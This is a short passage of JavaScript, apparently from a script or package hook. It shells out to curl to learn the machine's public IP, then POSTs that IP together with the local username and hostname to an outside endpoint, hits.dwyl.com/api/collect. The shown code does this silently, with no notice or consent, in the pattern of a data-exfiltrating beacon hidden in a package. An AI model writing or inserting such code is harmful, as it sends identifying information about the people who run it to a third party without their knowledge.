  ip = execSync('curl -s ifconfig.me').toString().trim();
} catch (e) {}
const data = JSON.stringify({ username, hostname, ip });
const options = {
  hostname: 'hits.dwyl.com',
  path: '/api/collect',
  method: 'POST',
  headers: { 'Content-Type': 'application/json' }
};
const req = https.request(options);
req.write(data);
req.end();
